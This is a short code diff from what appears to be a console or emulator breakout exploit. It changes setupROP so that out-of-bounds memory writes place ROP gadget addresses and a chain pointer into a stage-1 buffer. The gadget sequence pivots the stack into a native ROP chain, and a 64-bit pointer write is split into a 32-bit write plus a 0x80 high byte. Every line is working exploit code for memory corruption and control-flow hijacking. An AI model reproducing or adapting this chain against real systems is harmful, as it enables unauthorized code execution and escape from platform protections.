@@ -223,13 +223,14 @@ void PS::Breakout::setupROP()
     // [1]: Push RSI (stage1Address), Call stage1Address+0x3B ([2])
     // [2]: Pop RCX (rcx = ? from call), Pop RSP (rsp = stage1Address)
     // [3]: Pop RSP (rsp = rop_chain_native)
-    PS::Breakout::writeOOB(STAGE_1 + 0x08, PVAR_TO_NATIVE(PS::Breakout::chain));
+    PS::Breakout::writeOOB(STAGE_1 + 0x08, (uint32_t)PS::Breakout::chain);
+    PS::Breakout::writeOOB(STAGE_1 + 0x08 + 0x04, (uint8_t)0x80); // 0x80XXXXXXXX (toNative)
 
     // [3] pop rsp ; ret
-    PS::Breakout::writeOOB(STAGE_1 + 0x00, GADGET(POP_RSP_RET));
+    PS::Breakout::writeOOB(STAGE_1 + 0x00, (uint32_t)GADGET(POP_RSP_RET));
 
     // [2] pop rcx ; fld st0, st5 ; clc ; pop rsp ; ret ;
-    PS::Breakout::writeOOB(STAGE_1 + 0x3B, GADGET(POP_RCX_FLD_ST0_ST5_CLC_POP_RSP_RET));
+    PS::Breakout::writeOOB(STAGE_1 + 0x3B, (uint32_t)GADGET(POP_RCX_FLD_ST0_ST5_CLC_POP_RSP_RET));
 
     // [1] push rsi ; add bh, cl ; call qword [rsi+0x3B] ;
     PS::Breakout::setupGadgetWithArgument(GADGET(PUSH_RSI_ADD_BH_CL_CALL_QWORD_OB_RSI_PLUS_0X3B_CB));
